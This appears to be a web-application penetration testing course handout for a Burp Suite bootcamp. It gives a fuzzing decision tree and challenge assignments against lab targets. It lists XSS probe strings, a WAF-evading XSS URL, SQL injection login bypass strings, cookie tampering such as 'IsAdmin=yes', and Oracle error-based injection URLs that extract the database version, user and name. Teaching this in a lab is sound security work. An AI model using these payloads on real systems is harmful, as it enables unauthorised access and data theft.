YourFirstName-YourLastName-Burp-Suite-Bootcamp-Day2-Challenge.docx)


###############################
# How much fuzzing is enough? #
###############################
There really is no exact science for determining the correct amount of fuzzing per parameter to do before moving on to something else.

Here are the steps that I follow when I'm testing (my mental decision tree) to figure out how much fuzzing to do.


Step 1: Ask yourself the 3 questions per page of the site.

Step 2: If the answer is yes, then go down that particular attack path with a few fuzz strings (I usually do 10-20 fuzz strings per parameter)

Step 3: When you load your fuzz strings - use the following decision tree

	- Are the fuzz strings causing a default error message (example 404)?
		- If this is the case then it is most likely NOT vulnerable

	- Are the fuzz strings causing a WAF or LB custom error message?
		- If this is the case then you need to find an encoding method to bypass


	- Are the fuzz strings causing an error message that discloses the backend type?
		- If yes, then identify DB type and find correct syntax to successfully exploit
		- Some example strings that I use are:
			'
			"
			()       	<----- Take the parameter value and put it in parenthesis
			(5-1)	 	<----- See if you can perform an arithmetic function


	- Are the fuzz strings rendering executable code?
		- If yes, then report XSS/CSRF/Response Splitting/Request Smuggling/etc
		- Some example strings that I use are:
			<b>hello</b>
			<u>hello</u>
			<script>alert(123);</script>
			<script>alert(xss);</script>
			<script>alert('xss');</script>
			<script>alert("xss");</script>


		



############################
# Trading Web App with WAF #
# http://54.213.131.105    #
############################


Try the following in the search box:
	<script>alert(123);</script>
	<script>alert(123);</script
	<script>alert(123)
	<script>alert
	<script>
	<script
	<scrip
	<scri
	<scr
	<sc
	<s
	<p
	<
	< s
	Joe'+OR+1=1;--

	
Open a new tab in firefox and try this:
	http://54.213.131.105/Searchresult.aspx?%u003cscript>prompt(123)%u003c/script>=ScriptName


	xss_upload.txt (Upload Bulk Order)
	<script>alert(123);</script>


Login Box:

	' or 1=1 or ''='
	anything



Tamper Data: (notice 2 session IDs)

	AcmeTrading=a4b796687b846dd4a34931d708c62b49; 		SessionID is md5
	IsAdmin=yes; 
	ASP.NET_SessionId=d10dlsvaq5uj1g550sotcg45



Profile - Detail	(tamper data)
	Disposition: form-data; name="ctl00$contentMiddle$HiddenField1"\r\n\r\njoe\r\n
	joe|set







###########################################################
# Attacking an Oracle/JSP based WebApp with SQL Injection #
###########################################################





http://54.69.156.253:8081/bookcompany/


user:	a' OR 'a'='a
pass:	a' OR 'a'='a







http://54.69.156.253:8081/bookcompany/author.jsp?id=111


[ Search by Username ]	Joe' OR 'a'='a












http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1



http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1' OR '1'='1















http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1' or 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1))--


Host is running:





http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1' or 1=utl_inaddr.get_host_address((SELECT user FROM dual))--

User is:





http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1' or 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name))--

Current database is:


#######################
# Burp Suite Bootcamp #
#######################
http://data.serviceplatform.org/wsdl_grabbing/seekda-wsdls.with_ini/36-CurrencyConvertor.wsdl


####################
# Course Materials #
####################

Slides:
https://s3.amazonaws.com/StrategicSec-Files/BurpSuiteBootcamp/WebAppSecIsNotEasyButCanBeSimple.pptx
https://s3.amazonaws.com/StrategicSec-Files/BurpSuiteBootcamp/Burp+Suite.pptx


Lab Manual:
https://s3.amazonaws.com/StrategicSec-Files/BurpSuiteBootcamp/BurpSuite-Bootcamp-v1.pdf


Day 1 Video:
https://s3.amazonaws.com/StrategicSec-Videos/2015/2015-12-06+09.10+Burp+Suite+Weekend+Bootcamp.mp4


Day 1 Homework:


Day 1 Challenge (Due 12 December):
Use Burp Suite to demonstrate with screenshots and explanations of how to test for the all of the OWASP Top 10 vulnerabilities against your choice of targets the following targets:
http://strategicsec.com
http://54.213.100.93/ 
http://54.186.248.116/
http://54.200.178.220/
http://54.213.131.105/

Submit the results via email in an MS Word document with (naming convention example: YourFirstName-YourLastName-Burp-Suite-Bootcamp-Day1-Challenge.docx)



Day 2 Video:
https://s3.amazonaws.com/StrategicSec-Videos/2015/2015-12-13+09.25+Burp+Suite+Weekend+Bootcamp.mp4


Day 2 Challenge (Due 19 December):
----------------------------------
Use the StrategicSec Ubuntu VM to demonstrate how to install, configure, and use at least five (5) of the following Burp Suite extensions from these websites and lists below: 
https://github.com/integrissecurity/carbonator
https://github.com/allfro/BurpKit
https://github.com/nccgroup/BurpSuiteLoggerPlusPlus
https://github.com/Quitten/Autorize
https://github.com/codewatchorg/sqlipy
https://github.com/augustd/burp-suite-token-fetcher
https://github.com/augustd/burp-suite-gwt-scan

https://webbreacher.wordpress.com/2015/07/25/my-favorite-burp-suite-extensions/
http://bughunting.guide/the-top-5-burp-suite-extensions/
https://www.codemagi.com/downloads/



You must use them against your choice of targets the following targets:
http://strategicsec.com
http://54.213.100.93/ 
http://54.186.248.116/
http://54.200.178.220/
http://54.213.131.105/

Submit the results via email in an MS Word document with (naming convention example: YourFirstName-YourLastName-Burp-Suite-Bootcamp-Day2-Challenge.docx)